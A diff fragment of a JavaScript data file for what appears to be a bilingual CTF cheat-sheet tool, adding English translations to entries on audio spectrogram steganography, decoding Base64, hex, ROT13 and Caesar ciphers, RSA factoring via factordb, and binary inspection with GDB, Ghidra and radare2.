+      { label: "Audio — Audacity (spectre)", label_en: "Audio — Audacity (spectrum)", cmd: "# Ouvrir dans Audacity > Changer en spectrogramme\n# Parfois le flag est visible dans les fréquences", cmd_en: "# Open in Audacity > Switch to spectrogram view\n# Sometimes the flag is visible in the frequencies" },
+      { label: "Audio — Sonic Visualiser", label_en: "Audio — Sonic Visualiser", cmd: "sonic-visualiser audio.wav\n# Ajouter 'Spectrogram' view", cmd_en: "sonic-visualiser audio.wav\n# Add 'Spectrogram' view" }
     ],
     lookfor: [
       "Exiftool : commentaires, GPS, auteur suspect",
@@ -1621,13 +1621,13 @@ const NODES = {
     description: "Challenges cryptographiques courants dans les CTF.",
     description_en: "Common cryptographic challenges in CTFs.",
     commands: [
-      { label: "Identifier le chiffrement", label_en: "Identify the cipher", cmd: "# Longueur et caractères :\n# Base64 : A-Za-z0-9+/= (longueur multiple de 4)\n# Hex : 0-9a-f uniquement\n# ROT13/Caesar : texte lisible décalé\n# Base32 : A-Z2-7= uniquement" },
+      { label: "Identifier le chiffrement", label_en: "Identify the cipher", cmd: "# Longueur et caractères :\n# Base64 : A-Za-z0-9+/= (longueur multiple de 4)\n# Hex : 0-9a-f uniquement\n# ROT13/Caesar : texte lisible décalé\n# Base32 : A-Z2-7= uniquement", cmd_en: "# Length and characters:\n# Base64: A-Za-z0-9+/= (length multiple of 4)\n# Hex: 0-9a-f only\n# ROT13/Caesar: shifted readable text\n# Base32: A-Z2-7= only" },
       { label: "Décoder Base64", label_en: "Decode Base64", cmd: "echo 'ENCODED' | base64 -d\npython3 -c \"import base64; print(base64.b64decode('ENCODED'))\"" },
       { label: "Décoder Hex", label_en: "Decode Hex", cmd: "echo 'HEXSTRING' | xxd -r -p\npython3 -c \"print(bytes.fromhex('HEXSTRING'))\"" },
       { label: "ROT13", label_en: "ROT13", cmd: "echo 'MESSAGE' | tr 'A-Za-z' 'N-ZA-Mn-za-m'" },
       { label: "Caesar cipher brute force", label_en: "Caesar cipher brute force", cmd: "python3 -c \"\nm='ENCODED_MESSAGE'\nfor i in range(26):\n  print(i,''.join([chr((ord(c)-65+i)%26+65) if c.isupper() else chr((ord(c)-97+i)%26+97) if c.islower() else c for c in m]))\n\"" },
-      { label: "RSA — factoriser avec factordb", label_en: "RSA — factor with factordb", cmd: "# Aller sur factordb.com avec le modulo N\n# Si factorisé → calculer phi = (p-1)(q-1)\n# d = pow(e, -1, phi)\n# m = pow(c, d, N)" },
-      { label: "CyberChef — tout faire en ligne", label_en: "CyberChef — do everything online", cmd: "# gchq.github.io/CyberChef — outil magique pour décoder" }
+      { label: "RSA — factoriser avec factordb", label_en: "RSA — factor with factordb", cmd: "# Aller sur factordb.com avec le modulo N\n# Si factorisé → calculer phi = (p-1)(q-1)\n# d = pow(e, -1, phi)\n# m = pow(c, d, N)", cmd_en: "# Go to factordb.com with the modulo N\n# If factored → compute phi = (p-1)(q-1)\n# d = pow(e, -1, phi)\n# m = pow(c, d, N)" },
+      { label: "CyberChef — tout faire en ligne", label_en: "CyberChef — do everything online", cmd: "# gchq.github.io/CyberChef — outil magique pour décoder", cmd_en: "# gchq.github.io/CyberChef — magic tool for decoding" }
     ],
     lookfor: [
       "Longueur et charset du ciphertext → identifier l'encodage",
@@ -1666,7 +1666,7 @@ const NODES = {
       { label: "GDB — débogueur", label_en: "GDB — debugger", cmd: "gdb ./binary\n(gdb) run\n(gdb) disas main\n(gdb) break *main\n(gdb) info registers" },
       { label: "Ghidra — décompilateur (GUI)", label_en: "Ghidra — decompiler (GUI)", cmd: "ghidra\n# Importer le binaire, analyser, chercher main()" },
       { label: "Radare2 — analyse statique", label_en: "Radare2 — static analysis", cmd: "r2 ./binary\n[0x..] aaa  # analyser\n[0x..] pdf @main  # désassembler main" },
-      { label: "Python — patcher une vérification", label_en: "Python — patch a check", cmd: "# Si le binaire compare un input à une chaîne statique\n# GDB : breakpoint avant la comparaison\n# Lire la valeur attendue en registre" }
+      { label: "Python — patcher une vérification", label_en: "Python — patch a check", cmd: "# Si le binaire compare un input à une chaîne statique\n# GDB : breakpoint avant la comparaison\n# Lire la valeur attendue en registre", cmd_en: "# If the binary compares input to a static string\n# GDB: breakpoint before the comparison\n# Read the expected value in a register" }
     ],
     lookfor: [
       "Strings : flag ou password hardcodé",
